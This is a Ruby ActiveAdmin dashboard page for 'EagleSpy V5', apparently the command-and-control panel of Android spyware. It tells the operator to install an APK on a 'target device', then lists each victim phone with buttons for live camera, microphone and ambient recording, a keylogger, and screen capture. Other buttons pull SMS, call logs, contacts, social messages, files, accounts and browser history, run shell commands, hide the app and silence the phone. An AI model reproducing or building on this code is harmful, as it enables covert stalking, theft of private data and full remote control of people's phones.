ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "Dashboard"

  content title: "EagleSpy V5" do

    devices = Smartphone.joins(:apk_installation).where("apk_installations.status = 'installed'")

    # ── Inline styles ──
    text_node raw(<<~HTML)
      <style>
        body.admin_dashboard #active_admin_content { background: #111; }
        body.admin_dashboard .dashboard-wrap { max-width: 1200px; margin: 0 auto; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; color: #eee; }
        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 24px; }
        .stat-box { background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 16px; text-align: center; }
        .stat-box .num { font-size: 28px; font-weight: 700; color: #0ff; }
        .stat-box .lbl { font-size: 12px; color: #888; margin-top: 4px; }
        .section-title { font-size: 16px; font-weight: 600; color: #0ff; margin: 20px 0 12px; border-bottom: 1px solid #333; padding-bottom: 6px; }
        .btn-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; margin-bottom: 20px; }
        .cmd-btn { display: flex; align-items: center; gap: 8px; padding: 10px 14px; background: #1a1a2e; border: 1px solid #333; border-radius: 6px; color: #ddd; text-decoration: none; font-size: 13px; transition: all 0.15s; cursor: pointer; }
        .cmd-btn:hover { background: #252545; border-color: #0ff; color: #fff; transform: translateY(-1px); }
        .cmd-btn .ico { font-size: 18px; }
        .device-card { background: #1a1a2e; border: 1px solid #333; border-radius: 10px; padding: 16px; margin-bottom: 16px; }
        .device-hdr { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
        .device-hdr h3 { margin: 0; font-size: 16px; color: #fff; }
        .device-hdr .sub { font-size: 12px; color: #888; }
        .dot-online { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #0f0; margin-right: 6px; }
        .dot-offline { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #f33; margin-right: 6px; }
        .empty-box { text-align: center; padding: 60px 20px; color: #888; }
        .empty-box h2 { color: #555; }
        .apk-url { background: #1a1a2e; border: 1px solid #333; border-radius: 6px; padding: 10px; font-family: monospace; color: #0ff; margin-top: 10px; display: inline-block; }
        .live-group { background: #0d1520; border: 1px solid #1a3a2a; border-radius: 8px; padding: 12px; margin-bottom: 16px; }
        .live-group .section-title { color: #0f0; border-color: #1a3a2a; }
        .toast-box { position: fixed; top: 20px; right: 20px; z-index: 9999; }
        .toast { background: #1a1a2e; border: 1px solid #0ff; border-radius: 6px; padding: 10px 16px; margin-bottom: 8px; color: #eee; font-size: 13px; animation: fadeIn 0.3s; }
        .toast.err { border-color: #f33; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
      </style>
      <div id="toast-box" class="toast-box"></div>
    HTML

    div class: "dashboard-wrap" do

      if devices.empty?
        div class: "empty-box" do
          h2 "No devices connected"
          para "Install the APK on target device to start."
          div class: "apk-url" do
            text_node "http://#{request.host}:#{request.port}/app-release.apk"
          end
        end
      else
        # ── Stats ──
        div class: "stats-row" do
          [
            [devices.count, "Devices"],
            [Keylog.count, "Keylogs"],
            [SmsMessage.count, "SMS"],
            [GeoLocation.count, "Locations"],
            [Picture.count, "Photos"],
            [Recording.count, "Recordings"],
          ].each do |val, lbl|
            div class: "stat-box" do
              div val.to_s, class: "num"
              div lbl, class: "lbl"
            end
          end
        end

        # ── Per-device cards ──
        devices.each do |device|
          is_online = device.updated_at && (Time.current - device.updated_at) < 5.minutes
          dot_cls = is_online ? "dot-online" : "dot-offline"
          status_txt = is_online ? "Online" : (device.updated_at ? "#{time_ago_in_words(device.updated_at)} ago" : "Unknown")

          div class: "device-card" do
            div class: "device-hdr" do
              div do
                h3 do
                  span "", class: dot_cls
                  text_node(device.name || "Device")
                end
                div "#{device.device_id} · #{status_txt}", class: "sub"
              end
            end

            # ── LIVE ──
            div class: "live-group" do
              div "🟢 LIVE", class: "section-title"
              div class: "btn-grid" do
                a href: admin_live_streaming_path(device_id: device.id), class: "cmd-btn" do
                  span "📹", class: "ico"; text_node "Camera"
                end
                a href: admin_live_location_path(device_id: device.id), class: "cmd-btn" do
                  span "📍", class: "ico"; text_node "Location"
                end
                a href: admin_keylogs_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                  span "⌨️", class: "ico"; text_node "Keylogger"
                end
                a href: microphone_rec_recordings_path(smartphone_id: device.id, duration: 10), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                  span "🎙️", class: "ico"; text_node "Mic Record"
                end
              end
            end

            # ── CAPTURE ──
            div "📸 CAPTURE", class: "section-title"
            div class: "btn-grid" do
              a href: take_picture_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📷", class: "ico"; text_node "Photo"
              end
              a href: front_camera_snap_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🤳", class: "ico"; text_node "Front Cam"
              end
              a href: dump_screen_snap_screenshots_path(smartphone_id: device.id), "data-remote": "true", class: "cmd-btn" do
                span "🖥️", class: "ico"; text_node "Screenshot"
              end
              a href: screen_record_screenshots_path(smartphone_id: device.id, duration: 30), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🎬", class: "ico"; text_node "Screen Rec"
              end
              a href: ambient_record_smartphones_path(smartphone_id: device.id, duration: 60), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🌙", class: "ico"; text_node "Ambient"
              end
            end

            # ── DATA ──
            div "📂 DATA", class: "section-title"
            div class: "btn-grid" do
              a href: admin_sms_messages_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "💬", class: "ico"; text_node "SMS"
              end
              a href: admin_call_logs_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "📞", class: "ico"; text_node "Calls"
              end
              a href: admin_contacts_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "👥", class: "ico"; text_node "Contacts"
              end
              a href: admin_pictures_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "🖼️", class: "ico"; text_node "Gallery"
              end
              a href: admin_recordings_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "🎵", class: "ico"; text_node "Audio"
              end
              a href: admin_screenshots_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "📱", class: "ico"; text_node "Screenshots"
              end
              a href: admin_social_media_messages_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "💭", class: "ico"; text_node "Social"
              end
              a href: admin_geo_locations_path(q: { smartphone_id_eq: device.id }), class: "cmd-btn" do
                span "🗺️", class: "ico"; text_node "All Locations"
              end
              a href: admin_file_browser_path(device_id: device.id), class: "cmd-btn" do
                span "📁", class: "ico"; text_node "Files"
              end
            end

            # ── EXTRACT ──
            div "⬇️ EXTRACT", class: "section-title"
            div class: "btn-grid" do
              a href: dump_device_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "ℹ️", class: "ico"; text_node "Device Info"
              end
              a href: dump_wifi_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📶", class: "ico"; text_node "WiFi Info"
              end
              a href: get_accounts_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🔑", class: "ico"; text_node "Accounts"
              end
              a href: get_app_usage_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📊", class: "ico"; text_node "App Usage"
              end
              a href: get_browser_history_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🌐", class: "ico"; text_node "Browser"
              end
              a href: dump_contacts_contacts_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📇", class: "ico"; text_node "Dump Contacts"
              end
            end

            # ── CONTROL ──
            div "🎮 CONTROL", class: "section-title"
            div class: "btn-grid" do
              a href: run_shell_command_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "💻", class: "ico"; text_node "Shell"
              end
              a href: list_apps_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📱", class: "ico"; text_node "List Apps"
              end
              a href: hide_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "cmd-btn" do
                span "👻", class: "ico"; text_node "Hide App"
              end
              a href: show_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "cmd-btn" do
                span "👁️", class: "ico"; text_node "Show App"
              end
              a href: toggle_wifi_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📡", class: "ico"; text_node "Toggle WiFi"
              end
              a href: wake_lock_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🔓", class: "ico"; text_node "Wake Lock"
              end
              a href: set_audio_mode_smartphones_path(smartphone_id: device.id, mode: 'silent'), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "🔇", class: "ico"; text_node "Silent"
              end
              a href: send_sms_sms_messages_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "cmd-btn" do
                span "📤", class: "ico"; text_node "Send SMS"
              end
            end

            # ── AI ──
            div "🤖 AI", class: "section-title"
            div class: "btn-grid" do
              a href: admin_ai_chat_path, class: "cmd-btn" do
                span "💬", class: "ico"; text_node "AI Chat"
              end
              a href: admin_ai_analysis_path, class: "cmd-btn" do
                span "🧠", class: "ico"; text_node "Analysis"
              end
              a href: admin_ai_health_path, class: "cmd-btn" do
                span "🔍", class: "ico"; text_node "Health"
              end
            end

          end # device-card
        end # devices.each
      end # if/else
    end # dashboard-wrap

    # ── Toast JS ──
    script do
      text_node <<~JS.html_safe
        document.addEventListener('ajax:success', function(e) {
          var msg = (e.detail && e.detail[0]) || 'Command sent';
          if (typeof msg !== 'string') msg = 'Command sent';
          showToast(msg);
        });
        document.addEventListener('ajax:error', function() { showToast('Command failed', true); });
        function showToast(msg, err) {
          var box = document.getElementById('toast-box');
          var t = document.createElement('div');
          t.className = 'toast' + (err ? ' err' : '');
          t.textContent = msg;
          box.appendChild(t);
          setTimeout(function() { t.remove(); }, 4000);
        }
      JS
    end

  end
end
